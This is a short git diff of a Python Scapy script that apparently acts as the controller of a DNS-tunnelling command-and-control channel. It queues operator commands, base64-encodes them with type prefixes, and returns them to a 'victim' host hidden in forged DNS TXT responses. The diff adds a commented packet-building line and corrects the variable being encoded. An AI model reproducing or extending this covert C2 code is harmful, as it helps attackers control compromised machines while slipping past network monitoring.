@@ -16,7 +16,7 @@ def commands_input():
             print(commands_que)
             
 def build_p(packet,data):
-
+    #PKT = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNS(qd=packet[DNS].qd,rd=0,qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,type='TXT',rdata=data))
     ip = IP(
         src=packet[IP].dst,
         dst=packet[IP].src
@@ -49,7 +49,7 @@ def send_command(ip_adr,vic_sport,get_qname,packet):
     elif prefix == SEND_MODEL:
         prefix = FILE
     #bin_command = bytes(command_name.encode())
-    bin_command = command_name.encode('ascii')
+    bin_command = command.encode('ascii')
     print(bin_command)
  
     combined = base64.b64encode(prefix) + base64.b64encode(bin_command)
